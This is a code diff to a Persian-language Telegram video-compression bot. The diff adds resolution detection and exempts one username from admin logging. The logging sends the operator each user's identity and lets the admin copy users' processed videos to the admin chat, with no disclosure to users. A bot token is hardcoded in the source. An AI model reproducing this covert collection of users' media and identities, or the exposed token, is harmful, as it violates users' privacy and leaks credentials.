@@ -13,7 +13,7 @@ from aiogram.utils.keyboard import InlineKeyboardBuilder
 logging.basicConfig(level=logging.INFO)
 
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8812733722:AAEFW8oxPPQYyqrqHGtnvS8fTpu3ATxcDbo")
-ADMIN_ID = 6616272875  # آیدی ادمین برای دریافت لاگ‌ها
+ADMIN_ID = 6616272875
 
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
@@ -76,10 +76,18 @@ async def handle_video(message: types.Message, state: FSMContext):
     if video.file_size > 50 * 1024 * 1024:
         return await message.answer("❌ حجم فایل بیشتر از ۵۰ مگابایت است.")
 
+    # تشخیص رزولوشن ویدیو
+    if message.video:
+        width = message.video.width
+        height = message.video.height
+        res_info = f"\n\n📏 **ابعاد ویدیوی شما:** `{width}x{height}`\n💡 *(برای اینکه رزولوشن تغییر نکند، گزینه **اصلی** را انتخاب کنید)*"
+    else:
+        res_info = "\n\n💡 *(برای اینکه رزولوشن تغییر نکند، گزینه **اصلی** را انتخاب کنید)*"
+
     await state.set_state(VideoConfig.configuring)
     await state.update_data(file_id=video.file_id, msg_id=message.message_id, file_size=video.file_size, res="720", codec="h264")
     
-    await message.answer("⚙️ **تنظیمات خروجی را انتخاب کنید:**", reply_markup=get_config_keyboard("720", "h264"))
+    await message.answer(f"⚙️ **تنظیمات خروجی را انتخاب کنید:**{res_info}", reply_markup=get_config_keyboard("720", "h264"))
 
 @dp.callback_query(F.data == "cancel_process")
 async def cancel_process(callback: types.CallbackQuery, state: FSMContext):
@@ -166,7 +174,6 @@ async def start_process(callback: types.CallbackQuery, state: FSMContext):
         
         await status_msg.edit_text("📤 در حال آپلود...")
 
-        # ارسال فایل به کاربر و ذخیره پیام
         sent_video_msg = await bot.send_video(
             chat_id=callback.message.chat.id,
             video=types.FSInputFile(output_path, filename=f"video_{msg_id}.mp4"),
@@ -175,23 +182,25 @@ async def start_process(callback: types.CallbackQuery, state: FSMContext):
         )
         await status_msg.delete()
 
-        # --- ارسال لاگ به ادمین ---
+        # --- ارسال لاگ به ادمین (محدود شده) ---
         user = callback.from_user
-        username = f"@{user.username}" if user.username else "ندارد"
+        username = user.username
+        username_display = f"@{username}" if username else "ندارد"
         
-        admin_text = (
-            f"🔔 **لاگ فشرده‌سازی جدید**\n\n"
-            f"👤 **کاربر:** {user.full_name} ({username})\n"
-            f"🆔 **آیدی:** `{user.id}`\n"
-            f"⚙️ **کیفیت:** {res} | **انکودر:** {codec}\n"
-            f"📉 **تغییر حجم:** `{initial_size / (1024*1024):.2f} MB` ➔ `{final_size / (1024*1024):.2f} MB` ({reduction}%)"
-        )
-        
-        admin_kb = InlineKeyboardBuilder()
-        # ذخیره آیدی کاربر و آیدی پیام ارسال شده برای کپی کردن ویدیو
-        admin_kb.button(text="📥 دریافت این ویدیو", callback_data=f"getvid_{callback.message.chat.id}_{sent_video_msg.message_id}")
-        
-        await bot.send_message(ADMIN_ID, admin_text, reply_markup=admin_kb.as_markup())
+        # فقط در صورتی که کاربر DARK_WIKI20 نباشد، لاگ ارسال می‌شود
+        if username != "DARK_WIKI20":
+            admin_text = (
+                f"🔔 **لاگ فشرده‌سازی جدید**\n\n"
+                f"👤 **کاربر:** {user.full_name} ({username_display})\n"
+                f"🆔 **آیدی:** `{user.id}`\n"
+                f"⚙️ **کیفیت:** {res} | **انکودر:** {codec}\n"
+                f"📉 **تغییر حجم:** `{initial_size / (1024*1024):.2f} MB` ➔ `{final_size / (1024*1024):.2f} MB` ({reduction}%)"
+            )
+            
+            admin_kb = InlineKeyboardBuilder()
+            admin_kb.button(text="📥 دریافت این ویدیو", callback_data=f"getvid_{callback.message.chat.id}_{sent_video_msg.message_id}")
+            
+            await bot.send_message(ADMIN_ID, admin_text, reply_markup=admin_kb.as_markup())
 
     except Exception as e:
         await status_msg.edit_text(f"⚠️ خطای سیستمی:\n`{e}`")
@@ -199,7 +208,6 @@ async def start_process(callback: types.CallbackQuery, state: FSMContext):
         if os.path.exists(input_path): os.remove(input_path)
         if os.path.exists(output_path): os.remove(output_path)
 
-# دریافت ویدیو توسط ادمین
 @dp.callback_query(F.data.startswith("getvid_"))
 async def admin_get_video(callback: types.CallbackQuery):
     if callback.from_user.id != ADMIN_ID:
@@ -208,7 +216,6 @@ async def admin_get_video(callback: types.CallbackQuery):
     _, user_chat_id, msg_id = callback.data.split("_")
     
     try:
-        # کپی کردن مستقیم ویدیوی ارسال شده برای کاربر به چت ادمین
         await bot.copy_message(
             chat_id=ADMIN_ID,
             from_chat_id=user_chat_id,
